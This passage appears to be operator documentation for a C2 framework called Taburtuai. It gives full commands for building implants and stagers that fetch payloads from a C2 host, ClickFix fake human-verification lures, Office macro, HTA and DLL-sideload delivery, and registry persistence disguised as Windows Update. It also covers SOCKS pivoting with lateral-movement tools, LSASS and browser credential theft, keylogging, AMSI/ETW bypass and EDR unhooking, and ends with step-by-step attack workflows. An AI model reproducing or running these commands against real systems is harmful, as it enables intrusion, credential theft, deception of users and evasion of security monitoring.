
**Default port list:** 21, 22, 23, 25, 53, 80, 88, 110, 135, 139, 143, 389, 443, 445, 587, 636, 1433, 1521, 3306, 3389, 5432, 5985, 5986, 6379, 8080, 8443, 9200, 27017

**Output format:**
```
192.168.1.10:22     open  12ms
192.168.1.10:80     open  8ms   Apache httpd 2.4.54
192.168.1.20:445    open  15ms
```

### ARP Scan

Dump the OS ARP table to enumerate active hosts on the local segment:

```bash
# Via interactive shell
[shell a3f91c2d] > arp -a
```

Or invoke `arp_scan` operation type to capture the full table and return it over the C2 channel.

---

## 24. Registry Operations

Read, write, list, and delete Windows registry keys and values.

**Supported hives:**

| Short | Full Name |
|---|---|
| `HKLM` | `HKEY_LOCAL_MACHINE` |
| `HKCU` | `HKEY_CURRENT_USER` |
| `HKCR` | `HKEY_CLASSES_ROOT` |
| `HKU` | `HKEY_USERS` |
| `HKCC` | `HKEY_CURRENT_CONFIG` |

**Supported value types:** `sz`, `expand_sz`, `multi_sz`, `dword`, `qword`

**Operation types (invoked via Phase 11 payload):**

| OperationType | Description |
|---|---|
| `reg_read` | Read a single named value |
| `reg_write` | Create or update a value |
| `reg_delete` | Delete a value (or entire key if value is empty) |
| `reg_list` | Enumerate all subkeys and values under a key |

**Common reconnaissance keys:**

```
# OS version
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion  → ProductName

# Installed software
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Autoruns
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Autologon credentials (if configured)
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
  → DefaultUserName, DefaultPassword
```

**Example: write a persistence key via registry:**

```
OperationType : reg_write
RegHive       : HKCU
RegKey        : Software\Microsoft\Windows\CurrentVersion\Run
RegValue      : WindowsUpdate
RegData       : C:\Windows\Temp\agent.exe
RegType       : sz
```

---

## 25. SOCKS5 Proxy Pivot

Start an in-process SOCKS5 proxy on the agent. Allows the operator to route tools through the agent's network connection into internal segments.

### Start

```
[shell a3f91c2d] > socks5_start
[+] SOCKS5 proxy listening on 127.0.0.1:1080

# Custom bind address
[shell a3f91c2d] > socks5_start 0.0.0.0:8888
```

### Stop

```
[shell a3f91c2d] > socks5_stop
[+] socks5 stopped (127.0.0.1:1080)
```

### Status

```
[shell a3f91c2d] > socks5_status
[socks5] running on 127.0.0.1:1080
```

### Tunneling Through the Proxy

The SOCKS5 port binds on the **target machine**. Forward it to the operator via SSH or another transport before using it:

```bash
# 1. Start SOCKS5 on agent (binds 127.0.0.1:1080 on target)
[shell a3f91c2d] > socks5_start

# 2. Forward to operator machine via SSH (if a jump host exists)
ssh -N -L 1080:127.0.0.1:1080 user@jumphost

# 3. Configure proxychains
# /etc/proxychains4.conf
[ProxyList]
socks5  127.0.0.1  1080

# 4. Route tools through the pivot
proxychains nmap -sT -Pn 192.168.10.0/24
proxychains impacket-psexec CORP/admin@192.168.10.5
proxychains evil-winrm -i 192.168.10.10 -u admin -p "P@ss"
proxychains crackmapexec smb 192.168.10.0/24 -u admin -p "P@ss"
```

---

## 26. Stage Management

Stages are AES-256-GCM encrypted payload blobs stored on the server with one-shot delivery tokens. After a stager downloads the payload, the stage is marked used and optionally deleted.

### Upload a Stage

```bash
./bin/operator stage upload <file> \
  [--format exe|shellcode|dll] \
  [--arch amd64|x86] \
  [--ttl <hours>] \
  [--desc "<description>"]
```

| Flag | Default | Description |
|---|---|---|
| `--format` | `exe` | Payload format hint for the stager |
| `--arch` | `amd64` | Target architecture |
| `--ttl` | `24` | Hours until the stage expires |
| `--desc` | — | Human-readable description |

```bash
# Upload full agent
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --format exe --arch amd64 --ttl 48 \
  --desc "Q1-2026 engagement"

# Upload shellcode payload
./bin/operator stage upload ./shellcode.bin \
  --format shellcode --ttl 12
```

Output:
```
[+] Stage uploaded (9842512 bytes)
    Token    : a1b2c3d4e5f67890abcdef...
    Stage URL: https://c2.corp.example.com/stage/a1b2c3d4e5f67890abcdef...
    Expires  : 2026-04-24T12:00:00Z
```

### List Stages

```bash
./bin/operator stage list
```

```
TOKEN                                 FORMAT      ARCH    USED    DESCRIPTION
─────────────────────────────────────────────────────────────────────────────
a1b2c3d4e5f67890..                    exe         amd64   no      Q1-2026 engagement
9f8e7d6c5b4a3210..                    shellcode   amd64   yes     Test run
```

### Delete Stage

```bash
./bin/operator stage delete <token>
```

```bash
./bin/operator stage delete a1b2c3d4e5f67890...
```

---

## 27. Implant Generator

The `generate` CLI produces delivery-ready implants from a single build command.

```bash
./bin/generate [stager|stageless|template|upload] [flags]
```

### Stager Generation

Compile and package a lightweight stager that downloads + executes a staged payload:

```bash
./bin/generate stager \
  --server <c2-url> \
  --token <stage-token> \
  --key <aes-key> \
  --format <format> \
  --output <output-file> \
  [--exec-method thread|hollow|drop] \
  [--jitter 0] \
  [--arch amd64]
```

**Execution methods:**

| Method | Behavior | Payload type required |
|---|---|---|
| `thread` | `VirtualAlloc(RWX)` + `CreateThread` | Shellcode |
| `hollow` | Process hollowing into `svchost.exe` | PE (EXE) |
| `drop` | Write to `%TEMP%\<random>.exe` + execute | PE (EXE) |

**Output formats:**

| Format | File | Description |
|---|---|---|
| `exe` | `.exe` | Compiled Windows executable |
| `ps1` | `.ps1` | PowerShell: base64 EXE → drop + execute |
| `ps1-mem` | `.ps1` | PowerShell: PInvoke shellcode runner (no disk write) |
| `hta` | `.hta` | HTML Application (VBScript wrapper) |
| `vba` | `.bas` | VBA macro (XMLHTTP + ADODB.Stream) |
| `cs` | `.cs` | C# PInvoke shellcode runner (compile separately) |
| `shellcode` | `.bin` | PE → shellcode via donut or built-in sRDI stub |
| `dll` | `.dll` | Proxy DLL for sideloading (requires mingw) |

```bash
# EXE stager with hollow execution
./bin/generate stager \
  --server https://c2.corp.example.com \
  --token abc123 --key MyKey1234567890X \
  --format exe --exec-method hollow \
  --output stager.exe

# PowerShell in-memory (no disk write of agent)
./bin/generate stager \
  --server https://c2.corp.example.com \
  --token abc123 --key MyKey1234567890X \
  --format ps1-mem --output stager.ps1

# HTA (browser open / double-click delivery)
./bin/generate stager \
  --server https://c2.corp.example.com \
  --token abc123 --format hta --output update.hta

# VBA macro (paste into Office document)
./bin/generate stager \
  --server https://c2.corp.example.com \
  --token abc123 --format vba --output macro.bas

# DLL sideloading (requires mingw installed)
./bin/generate stager \
  --server https://c2.corp.example.com \
  --token abc123 --format dll --output version.dll
```

### Stageless Generation

Build a fully self-contained agent:

```bash
./bin/generate stageless \
  --server https://c2.corp.example.com \
  --key MyKey1234567890X \
  --interval 60 --jitter 30 \
  --kill-date 2026-12-31 \
  --format exe \
  --output agent.exe
```

### Delivery Templates

```bash
./bin/generate template <type> [flags]
```

| Template | Description |
|---|---|
| `clickfix` | Fake browser verification page with Win+R clipboard payload |
| `macro` | Office VBA macro generator |
| `hta` | Standalone HTA delivery page |
| `lnk` | Windows shortcut (`.lnk`) file |
| `iso` | ISO image with autorun + payload |

**ClickFix example:**

```bash
./bin/generate template clickfix \
  --stager ./stager.ps1 \
  --lure "browser-verification" \
  --output delivery.html
```

The page presents a fake "Verify you are human" prompt. When the target clicks the button, a base64-encoded PowerShell command is copied to clipboard and the user is instructed to paste it into Win+R.

### Complete Staged Workflow

```bash
# Step 1 — Build the full stealth agent
make agent-win-stealth \
  C2_SERVER=https://c2.corp.example.com \
  ENC_KEY=MyKey1234567890X

# Step 2 — Upload as an encrypted stage
./bin/operator stage upload ./bin/agent_windows_stealth.exe \
  --format exe --arch amd64 --ttl 48 --desc "Engagement Q1"
# → Token: abc123, URL: https://c2.corp.example.com/stage/abc123

# Step 3 — Build stager with stage reference
./bin/generate stager \
  --server https://c2.corp.example.com \
  --token abc123 --key MyKey1234567890X \
  --exec-method hollow \
  --format ps1-mem \
  --output stager.ps1

# Step 4 — Create ClickFix delivery page
./bin/generate template clickfix \
  --stager ./stager.ps1 \
  --lure "chrome-update" \
  --output delivery.html

# Step 5 — Deliver & operate
#   Target opens delivery.html → pastes Win+R command → agent beacons in
./bin/operator console
taburtuai › agents list
taburtuai › shell <agent-id>
```

---

## 28. Server & Logs

### View Logs

```bash
./bin/operator logs [--limit 100] [--level INFO|WARN|ERROR|DEBUG] [--category SYSTEM|COMMAND_EXEC|AUDIT]
```

```bash
# Last 50 errors
./bin/operator logs --limit 50 --level ERROR

# Command execution audit trail
./bin/operator logs --category COMMAND_EXEC --limit 200
```

### Server Statistics

```bash
./bin/operator stats
```

Shows: active agent count, total commands, pending queue depth, stage count, uptime.

### Version

```bash
./bin/operator version
```

---

## 29. Quick Reference Card

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  TABURTUAI C2  —  Quick Reference
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ENVIRONMENT
  export TABURTUAI_SERVER=https://c2.example.com
  export TABURTUAI_API_KEY=token
  ./bin/operator console

AGENTS
  agents list                                    list connected agents
  agents info <id>                               detailed info
  agents delete <id>                             remove database record

EXECUTION
  shell   <id> [--timeout N]                     interactive shell
  cmd     <id> "<cmd>" [--workdir] [--bg]        single command
  status  <cmd-id>                               poll result
  history <id> [--limit N] [--status S]          command history

FILES
  files upload   <id> <local>  <remote>          push file to agent
  files download <id> <remote> <local>           pull file from agent

PROCESS
  process list  <id>                             enumerate processes
  process kill  <id> --pid N | --name name       terminate process
  process start <id> <exe> [--args "..."]        spawn process

PERSISTENCE
  persistence setup  <id> --method M --path exe [--name] [--args]
  persistence remove <id> --method M --name N
  ── methods ──────────────────────────────────────────────────
  Windows: registry_run, schtasks_onlogon, schtasks_daily, startup_folder
  Linux:   cron_reboot, systemd_user, bashrc
  macOS:   launchagent

LOLBin FETCH
  fetch <id> <url> <remote> [--method certutil|bitsadmin|curl|powershell]

ALTERNATE DATA STREAMS
  ads write <id> <local>          "<file:stream>"
  ads read  <id> "<file:stream>"  <local>
  ads exec  <id> "<file:stream>"

INJECTION
  inject remote  <id> --file sc.bin --pid N [--method crt|apc]
  inject self    <id> --file sc.bin
  inject ppid    <id> <exe> [--ppid N | --ppid-name name] [--args "..."]
  hollow         <id> --file sc.bin [--exe host.exe]
  hijack         <id> --file sc.bin --pid N
  stomp          <id> --file sc.bin [--dll sacrificial.dll]
  mapinject      <id> --file sc.bin [--pid N]

BYPASS
  bypass amsi  <id> [--pid N]
  bypass etw   <id> [--pid N]

TOKENS
  token list   <id>
  token steal  <id> --pid N
  token make   <id> --user U --domain D --pass P
  token revert <id>

CREDENTIALS
  creds lsass     <id> [--output path]
  creds sam       <id> [--dir path]
  creds browser   <id>
  creds clipboard <id>

RECON
  screenshot    <id> [--save path]
  keylog start  <id> [--duration N]
  keylog dump   <id>
  keylog stop   <id>

TIMESTOMP
  timestomp <id> <target> [--ref ref-file] [--time RFC3339]

EVASION
  evasion sleep      <id> --duration N
  evasion unhook     <id>
  evasion hwbp set   <id> --addr 0xHEX [--register 0-3]
  evasion hwbp clear <id> [--register 0-3]

BOF
  bof <id> <coff.o> [--args-file packed.bin]

OPSEC
  opsec antidebug  <id>
  opsec antivm     <id>
  opsec timegate   <id> [--start H] [--end H] [--kill-date YYYY-MM-DD]

STAGES
  stage upload <file> [--format] [--arch] [--ttl hours] [--desc "..."]
  stage list
  stage delete <token>

QUEUE / SERVER
  queue stats
  queue clear <id>
  logs   [--limit N] [--level L] [--category C]
  stats
  version

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ATTACK WORKFLOWS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

[ClickFix → Staged → Credential Harvest]
  1. make agent-win-stealth C2_SERVER=https://... ENC_KEY=...
  2. stage upload agent_windows_stealth.exe --format exe --ttl 48
  3. generate stager --token <tok> --format ps1-mem --exec-method hollow
  4. generate template clickfix --stager stager.ps1
  5. Deliver delivery.html → target executes → agent beacons in
  6. opsec antidebug + opsec antivm          (verify clean environment)
  7. bypass amsi + bypass etw                (kill telemetry)
  8. evasion unhook                          (remove EDR NTDLL hooks)
  9. token list → token steal --pid <SYSTEM-proc>
  10. creds lsass --wait → files download lsass.dmp
  11. creds browser --wait                   (harvest browser passwords)
  12. mapinject --file beacon.bin --pid <explorer>

[USB Drop → Stageless → Persistence]
  1. make agent-custom C2_SERVER=https://... INTERVAL=300 JITTER=40
  2. Copy EXE to USB (rename to look like a document)
  3. Target double-clicks → agent beacons
  4. persistence setup --method registry_run --path <agent-path>
  5. opsec timegate --start 8 --end 17 --kill-date 2026-06-30

[Pass-the-Credentials → Lateral Movement]
  1. Obtain creds from lsass dump or browser harvest
  2. token make --user admin --domain CORP --pass <password>
  3. inject ppid "powershell.exe" --ppid-name "explorer.exe"
       --args "-Enc <base64-command>"
  4. socks5_start → proxychains evil-winrm -i <internal-host>

[High-Value Target / EDR-Protected]
  1. evasion unhook           (clear NTDLL hooks first)
  2. bypass amsi + etw
  3. evasion hwbp set --addr <EtwEventWrite-addr> --register 0
  4. stomp --file sc.bin --dll version.dll
     (shellcode executes from legitimate DLL memory)
  5. evasion sleep --duration 300
     (XOR-encrypt agent memory between operations)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
